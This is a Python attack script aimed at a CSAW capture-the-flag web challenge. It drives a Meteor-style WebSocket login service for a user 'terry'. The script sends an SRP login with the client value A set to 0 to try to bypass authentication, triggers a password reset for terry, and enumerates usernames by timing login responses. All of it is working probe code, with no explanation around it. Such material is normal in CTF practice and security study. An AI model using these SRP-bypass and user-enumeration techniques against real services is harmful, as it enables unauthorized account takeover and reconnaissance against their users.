import json
from websocket import create_connection
import hashlib
import random
import time

def sha256(data):
    return hashlib.sha256(str(data).encode()).hexdigest()

ws = create_connection('ws://web.chal.csaw.io:5000/websocket')

# Initial connection
connect_msg = {
    "msg": "connect",
    "version": "1",
    "support": ["1"]
}
ws.send(json.dumps(connect_msg))
print("Connect:", ws.recv())

# Try to initiate login with terry
method_msg = {
    "msg": "method",
    "method": "beginPasswordExchange",
    "id": "1",
    "params": ["terry"]
}
ws.send(json.dumps(method_msg))
print("Begin password exchange:", ws.recv())

# Try to manipulate SRP parameters
srp_params = {
    "msg": "method",
    "method": "login",
    "id": "2",
    "params": [{
        "srp": {
            "A": "0",  # Setting A to 0 might cause issues in SRP validation
            "clientB": sha256(random.randint(1, 1000000)),
            "user": {"username": "terry"}
        }
    }]
}
ws.send(json.dumps(srp_params))
print("SRP manipulation:", ws.recv())

# Try password reset functionality
reset_msg = {
    "msg": "method",
    "method": "forgotPassword",
    "id": "3",
    "params": [{"email": "terry@securinotes.com"}]
}
ws.send(json.dumps(reset_msg))
print("Password reset attempt:", ws.recv())

# Try to enumerate users through timing attack
usernames = ["terry", "admin", "administrator", "user", "test"]
for username in usernames:
    start = time.time()
    ws.send(json.dumps({
        "msg": "method",
        "method": "login",
        "id": "4",
        "params": [{"user": {"username": username}, "password": {"digest": "a"*64, "algorithm": "sha-256"}}]
    }))
    resp = ws.recv()
    end = time.time()
    print(f"Username {username} took {end-start:.4f}s:", resp)

ws.close()

